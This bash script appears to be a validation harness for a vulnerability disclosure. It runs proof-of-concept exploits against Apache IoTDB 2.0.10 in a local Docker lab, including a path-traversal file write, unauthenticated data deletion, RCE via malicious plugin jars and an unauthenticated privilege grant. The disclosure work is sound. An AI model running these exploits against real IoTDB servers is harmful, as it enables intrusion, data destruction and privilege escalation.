#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Apache IoTDB v2.0.10 — one-command validation harness.
#
# Stands up the lab (with the internal ports exposed so every finding can run),
# builds the PoC runner from the official release jars, executes each PoC, and
# captures INDEPENDENTLY-AUDITABLE evidence: before/after state from the server's
# own CLI, the malicious RPC response codes, the server-side execution markers,
# and the relevant server-log lines — all timestamped — into evidence/EVIDENCE.md.
#
# Usage:
#   ./run-all.sh                 # full run, tears the lab down at the end
#   KEEP=1 ./run-all.sh          # leave the lab running for manual inspection
#   ONLY="F-01 F-04" ./run-all.sh
#
# Requires: docker + docker compose. Nothing else on the host.
# ---------------------------------------------------------------------------
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/.." && pwd)"
LAB="$REPO/lab"
EV="$REPO/evidence/EVIDENCE.md"
PROJ="iotdblab"
NET="${PROJ}_default"
CID="iotdb-lab"
PW_DEFAULT="root"

mkdir -p "$REPO/evidence"
: > "$EV"
log(){ echo "$@" | tee -a "$EV" ; }
hr(){ log "" ; log "---" ; log "" ; }

cli(){ # run a single SQL statement through the server's own CLI, as root
  docker exec "$CID" bash -lc "/iotdb/sbin/start-cli.sh -h iotdb-lab -p 6667 -u root -pw '${1}' -e \"${2}\"" 2>/dev/null
}
poc(){ docker run --rm --network "$NET" -e TZ=UTC iotdb-poc "$@" 2>&1 ; }
marker(){ docker exec "$CID" sh -c "cat '$1' 2>/dev/null || echo '(absent)'" ; }
serverlog(){ docker logs "$CID" 2>&1 | grep -E "$1" | tail -n "${2:-6}" ; }

log "# Apache IoTDB v2.0.10 — validation evidence"
log ""
log "- Generated: \`$(date -u +%Y-%m-%dT%H:%M:%SZ)\` (UTC)"
log "- Image: \`apache/iotdb:2.0.10-standalone\` (release commit 3c26382bebee73ec1c9593f836ef4cdcc0376062)"
log "- Harness: \`pocs/run-all.sh\` — before/after state is read from the server's OWN CLI, not asserted by the PoC."
log ""

echo ">> starting lab (internal ports exposed for F-04/F-09)…"
( cd "$LAB" && docker compose -p "$PROJ" -f docker-compose.yml -f docker-compose.internal.yml up -d ) >/dev/null 2>&1
echo ">> waiting for IoTDB to accept connections…"
for i in $(seq 1 60); do
  if docker exec "$CID" bash -lc ':> /dev/tcp/iotdb-lab/6667' 2>/dev/null; then break; fi
  sleep 3
done
# CLI needs the query engine fully up; give it a moment and probe with a real query.
for i in $(seq 1 40); do
  if cli "$PW_DEFAULT" "SHOW DATABASES" | grep -qiE 'Database|Total|It costs'; then break; fi
  sleep 3
done
echo ">> building PoC runner from official release jars…"
docker build -q -t iotdb-poc "$HERE" >/dev/null

want(){ [ -z "${ONLY:-}" ] || echo " ${ONLY} " | grep -q " $1 " ; }

# ===================== F-07 : unauthenticated connection disclosure =====================
if want F-07; then
  hr; log "## F-07 — Unauthenticated connection/username disclosure (port 6667)"
  # Hold a root session open for ~12s: the CLI reads one statement then blocks on
  # stdin (sleep) keeping the session alive while the unauthenticated PoC runs.
  docker exec -d "$CID" bash -lc \
    "(echo 'SHOW DATABASES;'; sleep 12) | /iotdb/sbin/start-cli.sh -h iotdb-lab -p 6667 -u root -pw $PW_DEFAULT" >/dev/null 2>&1 || true
  sleep 3
  log "A separate root session is held open; the unauthenticated caller enumerates it:"
  log '```'
  poc F07_ConnectionInfoLeak iotdb-lab 6667 | tee -a "$EV" >/dev/null
  log '```'
  sleep 10
fi

# ===================== F-02 : pre-auth arbitrary-directory file write =====================
if want F-02; then
  hr; log "## F-02 — Pre-auth arbitrary-directory file write as root (port 6667)"
  docker exec "$CID" sh -c 'rm -f /tmp/RAPTOR_F02_PROOF.patch' 2>/dev/null
  log "BEFORE — target file absent:"; log '```'; log "$(marker /tmp/RAPTOR_F02_PROOF.patch)"; log '```'
  log "PoC (no credentials):"; log '```'
  poc F02_LegacyFileWrite iotdb-lab 6667 '../../../../../../../tmp/RAPTOR_F02_PROOF' | tee -a "$EV" >/dev/null
  log '```'
  log "AFTER — file written OUTSIDE the sync dir, owned by the server user:"; log '```'
  log "$(docker exec "$CID" sh -c 'ls -la /tmp/RAPTOR_F02_PROOF.patch 2>/dev/null; cat /tmp/RAPTOR_F02_PROOF.patch 2>/dev/null')"
  log '```'
fi

# ===================== F-05 : unauth data destruction as root =====================
if want F-05; then
  hr; log "## F-05 — Unauthenticated data destruction as root (port 6667)"
  cli "$PW_DEFAULT" "CREATE DATABASE root.demo" >/dev/null 2>&1
  cli "$PW_DEFAULT" "CREATE TIMESERIES root.demo.d.s WITH DATATYPE=INT64,ENCODING=PLAIN" >/dev/null 2>&1
  for i in $(seq 0 40); do cli "$PW_DEFAULT" "INSERT INTO root.demo.d(timestamp,s) VALUES($i,$i)" >/dev/null 2>&1; done
  log "BEFORE — row count (via server CLI, as root):"; log '```'; log "$(cli "$PW_DEFAULT" 'SELECT count(s) FROM root.demo.d')"; log '```'
  log "PoC (no credentials):"; log '```'
  poc F05_LegacyDataDeletion iotdb-lab 6667 root.demo.d.s | tee -a "$EV" >/dev/null
  log '```'
  sleep 2
  log "AFTER — row count (via server CLI, as root):"; log '```'; log "$(cli "$PW_DEFAULT" 'SELECT count(s) FROM root.demo.d')"; log '```'
fi

# ===================== F-01 : unauth pipe-config-plane RCE =====================
if want F-01; then
  hr; log "## F-01 — Unauthenticated RCE as root via the pipe config-plane (port 6667)"
  log "_Unauthenticated tier requires root's password to still be the default 'root'._"
  docker exec "$CID" sh -c 'rm -f /tmp/RAPTOR_PIPEPLUGIN_PROOF.txt' 2>/dev/null
  log "BEFORE — execution marker absent:"; log '```'; log "$(marker /tmp/RAPTOR_PIPEPLUGIN_PROOF.txt)"; log '```'
  log "PoC (no credentials):"; log '```'
  poc F01_PipeConfigPlanRce iotdb-lab 6667 /poc/raptorplugin.jar | tee -a "$EV" >/dev/null
  log '```'
  sleep 3
  log "AFTER — command executed in the server process (marker written by the plugin static initializer):"
  log '```'; log "$(marker /tmp/RAPTOR_PIPEPLUGIN_PROOF.txt)"; log '```'
  log "The marker's \`uid=0(root)\` line is the malicious plugin's static initializer running \`id\` inside the server process."
fi

# ===================== F-04 : unauth internal-RPC RCE =====================
if want F-04; then
  hr; log "## F-04 — Unauthenticated RCE as root via DataNode internal RPC (port 10730)"
  log "_Conditional on reachability of port 10730 (exposed here via the internal overlay)._"
  docker exec "$CID" sh -c 'rm -f /tmp/RAPTOR_RCE_PROOF.txt' 2>/dev/null
  log "BEFORE — execution marker absent:"; log '```'; log "$(marker /tmp/RAPTOR_RCE_PROOF.txt)"; log '```'
  FN="validationudf$(date +%s)"
  log "PoC (no session, no credentials):"; log '```'
  poc F04_InternalRpcRce iotdb-lab 10730 /poc/raptorpwn.jar "$FN" | tee -a "$EV" >/dev/null
  log '```'
  sleep 3
  log "AFTER — command executed in the server process (marker written by the UDF static initializer):"
  log '```'; log "$(marker /tmp/RAPTOR_RCE_PROOF.txt)"; log '```'
fi

# ===================== F-09 : unauth ConfigNode grant + digest =====================
if want F-09; then
  hr; log "## F-09 — Unauthenticated privilege grant + digest disclosure via ConfigNode RPC (port 10710)"
  log "_Conditional on reachability of port 10710 (exposed here via the internal overlay)._"
  cli "$PW_DEFAULT" "DROP USER validationlow" >/dev/null 2>&1
  cli "$PW_DEFAULT" "CREATE USER validationlow 'Validation@12345'" >/dev/null 2>&1
  log "BEFORE — privileges of validationlow (via server CLI, as root):"; log '```'; log "$(cli "$PW_DEFAULT" 'LIST PRIVILEGES OF USER validationlow')"; log '```'
  log "PoC (no session, no credentials):"; log '```'
  poc F09_ConfigNodeGrant iotdb-lab 10710 validationlow MANAGE_ROLE | tee -a "$EV" >/dev/null
  log '```'
  sleep 1
  log "AFTER — validationlow now holds MANAGE_ROLE, granted with no authentication:"; log '```'; log "$(cli "$PW_DEFAULT" 'LIST PRIVILEGES OF USER validationlow')"; log '```'
fi

hr
log "## Environment"
log '```'
log "$(docker exec "$CID" bash -lc 'java -version 2>&1 | head -1; id' 2>/dev/null)"
log "iotdb image digest: $(docker image inspect apache/iotdb:2.0.10-standalone --format '{{index .RepoDigests 0}}' 2>/dev/null)"
log '```'

echo ">> evidence written to: $EV"
if [ "${KEEP:-0}" != "1" ]; then
  echo ">> tearing down lab (set KEEP=1 to keep it)…"
  ( cd "$LAB" && docker compose -p "$PROJ" -f docker-compose.yml -f docker-compose.internal.yml down -v ) >/dev/null 2>&1
else
  echo ">> lab left running (project '$PROJ'). Tear down with:"
  echo "   ( cd lab && docker compose -p $PROJ -f docker-compose.yml -f docker-compose.internal.yml down -v )"
fi
echo ">> done."
